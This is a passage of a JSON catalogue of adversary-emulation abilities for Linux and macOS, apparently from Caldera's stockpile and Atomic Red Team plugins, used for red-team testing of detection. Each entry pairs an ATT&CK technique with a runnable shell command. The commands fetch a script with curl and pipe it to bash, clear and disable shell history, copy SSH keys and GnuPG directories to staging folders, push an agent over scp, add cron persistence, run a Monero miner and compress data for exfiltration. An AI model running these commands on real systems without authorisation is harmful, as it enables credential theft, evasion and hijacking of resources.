                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Check Chrome",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "830bb6ed-9594-4817-b1a1-c298c0f9f425",
        "technique_id": "T1518",
        "repeatable": false
    },
    {
        "description": "Check to see if GoLang is installed",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "which go",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Check Go",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "9849d956-37ea-49f2-a8b5-f2ca080b315d",
        "technique_id": "T1518",
        "repeatable": false
    },
    {
        "description": "Check to see what version of python is installed",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "python3 --version;python2 --version;python --version",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Check Python",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "b18e8767-b7ea-41a3-8e80-baf65a5ddef5",
        "technique_id": "T1518",
        "repeatable": false
    },
    {
        "description": "chmods a file using a c script\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "/tmp/T1222002 /tmp/ T1222002",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Chmod through c script",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "2b403e3d0f5501a43b025c29b7c55d60",
        "technique_id": "T1222.002",
        "repeatable": false
    },
    {
        "description": "chowns a file to root using a c script\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "2a24e8_chown.c"
                ],
                "command": "sudo /tmp/T1222002own 2a24e8_chown.c",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Chown through c script",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0503af9fd6d1fbc9ddc632c91e32d2de",
        "technique_id": "T1222.002",
        "repeatable": false
    },
    {
        "description": "Clears bash history via cat /dev/null\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Command History",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "cat /dev/null > ~/.bash_history",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Clear Bash history (cat dev/null)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "a534890161825ac40b02e5f4c82cc5dd",
        "technique_id": "T1070.003",
        "repeatable": false
    },
    {
        "description": "Clears bash history via a symlink to /dev/null\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Command History",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ln -sf /dev/null ~/.bash_history",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Clear Bash history (ln dev/null)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6ee56fbf12b8fe3df6bb96aa4abcbe01",
        "technique_id": "T1070.003",
        "repeatable": false
    },
    {
        "description": "Clears bash history via rm\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Command History",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "rm ~/.bash_history",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Clear Bash history (rm)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0b3075a32ff077d5e0c8212ff796ec36",
        "technique_id": "T1070.003",
        "repeatable": false
    },
    {
        "description": "Clears the history and disable bash history logging of the current shell and future shell sessions\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Command History",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "set +o history; echo 'set +o history' >> ~/.bashrc; . ~/.bashrc; history -c",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "sed -i 's/set +o history//g' ~/.bashrc; . ~/.bashrc; set -o history"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Clear and Disable Bash History Logging",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "64099c73cfd2e72b45bf167e755e414c",
        "technique_id": "T1070.003",
        "repeatable": false
    },
    {
        "description": "Clears the history of a bunch of different shell types by setting the history size to zero\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Command History",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "unset HISTFILE; export HISTFILESIZE=0; history -c",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Clear history of a bunch of shells",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c9c5e0ffc0a02e309f7bdf4e2a3e5a65",
        "technique_id": "T1070.003",
        "repeatable": false
    },
    {
        "description": "Locate all active IP and FQDNs on the network",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "arp -a",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.ipaddr",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "remote.host.ip",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Collect ARP details",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.\n\nUpon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: Bash",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash; wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm /tmp/art-fish.txt"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Command-Line Interface",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "8764d6c964901b9a56ca3ffe5e5a004a",
        "technique_id": "T1059.004",
        "repeatable": false
    },
    {
        "description": "Compress a directory on the file system",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.staged"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [
                    "rm #{host.dir.staged}.tar.gz"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Compress staged directory",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
        "technique_id": "T1560.001",
        "repeatable": false
    },
    {
        "description": "Enable traffic redirection.\n\nNote that this test may conflict with pre-existing system configuration.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Proxy: Internal Proxy",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "export",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "unset http_proxy; unset https_proxy"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Connection Proxy",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "e3dac029090c397b775979ddb50fc30f",
        "technique_id": "T1090.001",
        "repeatable": false
    },
    {
        "description": "Enable traffic redirection on macOS UI (not terminal).\nThe test will modify and enable the \"Web Proxy\" and \"Secure Web Proxy\" settings  in System Preferences => Network => Advanced => Proxies for the specified network interface.\n\nNote that this test may conflict with pre-existing system configuration.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Proxy: Internal Proxy",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Connection Proxy for macOS UI",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "c9b955a568daf19171ce87c25c7fd24c",
        "technique_id": "T1090.001",
        "repeatable": false
    },
    {
        "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Lateral Tool Transfer",
        "requirements": [],
        "singleton": true,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "sandcat.go-linux"
                ],
                "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Copy 54ndc47 (WinRM and SCP)",
        "tactic": "lateral-movement",
        "plugin": "stockpile",
        "ability_id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d",
        "technique_id": "T1570",
        "repeatable": false
    },
    {
        "description": "copy the contents for the clipboard and print them",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Clipboard Data",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "xclip -o",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Copy Clipboard",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2",
        "technique_id": "T1115",
        "repeatable": false
    },
    {
        "description": "Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Private Keys",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "mkdir /tmp/art-staging; find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \\; exit 0",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -rf /tmp/art-staging"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Copy Private SSH Keys with rsync",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "f4dac543bf0d8241df7f584ad501bbd7",
        "technique_id": "T1552.004",
        "repeatable": false
    },
    {
        "description": "Copies and deletes mail data on macOS\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Email Collection: Mailbox Manipulation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Copy and Delete Mailbox Data on macOS",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "90ac777137516d90df82cb4a18864f93",
        "technique_id": "T1070.008",
        "repeatable": false
    },
    {
        "description": "Copies and modifies mail data on macOS\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Email Collection: Mailbox Manipulation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Copy and Modify Mailbox Data on macOS",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "71f3968aa7bf30baa94c3e1ac1e2ebf1",
        "technique_id": "T1070.008",
        "repeatable": false
    },
    {
        "description": "Copy in new loginwindow.plist to launch Calculator.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Re-opened Applications",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Copy in loginwindow.plist for Re-Opened Applications",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "13370afb983bcc3344af451d8877f047",
        "technique_id": "T1547.007",
        "repeatable": false
    },
    {
        "description": "Copy the users GnuPG (.gnupg) directory on a Mac or Linux system to a staging folder using the `rsync` command.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Private Keys",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "mkdir /tmp/GnuPG; find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \\; exit 0",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -rf /tmp/GnuPG"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Copy the users GnuPG directory with rsync",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "1d6526136ce6998ddb48511587e8ffe6",
        "technique_id": "T1552.004",
        "repeatable": false
    },
    {
        "description": "Add a hidden user on macOS using IsHidden optoin\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: Hidden Users",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create Hidden User using IsHidden option",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "8c47e4a4fe7c3e255b062ca1339d11ed",
        "technique_id": "T1564.002",
        "repeatable": false
    },
    {
        "description": "Add a hidden user on macOS using Unique ID < 500 (users with that ID are hidden by default)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: Hidden Users",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create Hidden User using UniqueID < 500",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "e7fed022d1e3befe9ac5dbb086f75363",
        "technique_id": "T1564.002",
        "repeatable": false
    },
    {
        "description": "Creates a hidden file inside a hidden directory\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: Hidden Files and Directories",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "mkdir /var/tmp/.hidden-directory; echo \"T1564.001\" > /var/tmp/.hidden-directory/.hidden-file",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -rf /var/tmp/.hidden-directory/"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Create a hidden file in a hidden directory",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "379509c4b83f252bc779446f0512e936",
        "technique_id": "T1564.001",
        "repeatable": false
    },
    {
        "description": "Creates a user on a MacOS system with dscl\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create Account: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create a user account on a MacOS system",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "45c73c8b658b660da5cc7bb6207bc08f",
        "technique_id": "T1136.001",
        "repeatable": false
    },
    {
        "description": "Creates and executes a simple bash script.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: Bash",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"; sh -c \"echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh\"; chmod +x /tmp/art.sh; sh /tmp/art.sh",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm /tmp/art.sh"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Create and Execute Bash Shell Script",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "8a84968196ec3b64b747b15008cafc2f",
        "technique_id": "T1059.004",
        "repeatable": false
    },
    {
        "description": "After execution the new account will be active and added to the Administrators group",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Valid Accounts: Local Accounts",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create local account with admin privileges - MacOS",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "d7264e14d130acb7e172b05ec2e1ae47",
        "technique_id": "T1078.003",
        "repeatable": false
    },
    {
        "description": "After execution the new account will be active and added to the Administrators group",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Valid Accounts: Local Accounts",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create local account with admin privileges using sysadminctl utility - MacOS",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "bbc5f212082c3b0472a1f50748d9be2a",
        "technique_id": "T1078.003",
        "repeatable": false
    },
    {
        "description": "create a directory for exfil staging",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Staged: Local Data Staging",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "mkdir -p staged && echo $PWD/staged",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.dir.staged",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [
                    "rm -rf staged"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Create staging directory",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
        "technique_id": "T1074.001",
        "repeatable": false
    },
    {
        "description": "This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Scheduled Task/Job: Cron",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.hourly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.monthly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.weekly/persistevil",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm /etc/cron.daily/persistevil; rm /etc/cron.hourly/persistevil; rm /etc/cron.monthly/persistevil; rm /etc/cron.weekly/persistevil"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Cron - Add script to all cron subfolders",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "d9a63c6a2dac4621d430d0570c995a09",
        "technique_id": "T1053.003",
        "repeatable": false
    },
    {
        "description": "This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Scheduled Task/Job: Cron",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "crontab -l > /tmp/notevil; echo \"* * * * * /tmp/evil.sh\" > /tmp/persistevil && crontab /tmp/persistevil",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "crontab /tmp/notevil"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Cron - Replace crontab with referenced file",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "074cad3a55b99b8e434702ffcf44f4d1",
        "technique_id": "T1053.003",
        "repeatable": false
    },
    {
        "description": "Download and execute Monero miner (xmrig) for 1 minute",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Resource Hijacking",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz;\ntar -xf xmrig-6.11.2-linux-x64.tar.gz;\ntimeout 60 ./xmrig-6.11.2/xmrig;\n[ $? -eq 124 ]",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -rf ./xmrig*;"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 120
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Crypto (Monero) Mining",
        "tactic": "impact",
        "plugin": "stockpile",
        "ability_id": "46da2385-cf37-49cb-ba4b-a739c7a19de4",
        "technique_id": "T1496",
        "repeatable": false
    },
    {
        "description": "Obtain user from current session",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "whoami",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Current User",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "bd527b63-9f9e-46e0-9816-b8434d2b8989",
        "technique_id": "T1033",
        "repeatable": false
    },
    {
        "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -f $HOME/victim-gzip.txt.gz"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Data Compressed - nix - gzip Single File",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "3f92476875c5ba5acad424dbf15bce4d",
        "technique_id": "T1560.001",
        "repeatable": false
    },
    {
        "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -f $HOME/data.tar.gz"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Data Compressed - nix - tar Folder or File",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "b87adfc0c92e77845da477f44a4d1944",
        "technique_id": "T1560.001",
        "repeatable": false
    },
    {
        "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard zip compression.\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "if [ $(ls /var/log/{w,b}tmp | wc -l) > 0 ] && [ -x $(which zip) ] ; then : ; else (which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip); echo Please set input_files argument to include files that exist; fi;  ;  zip $HOME/data.zip /var/log/{w,b}tmp",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -f $HOME/data.zip"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Data Compressed - nix - zip",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "c6c8a02a5633bdc9f887b94140a95934",
        "technique_id": "T1560.001",
        "repeatable": false
    },
    {
        "description": "Encrypt data for exiltration\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "requirements": [],
        "singleton": false,
        "executors": [
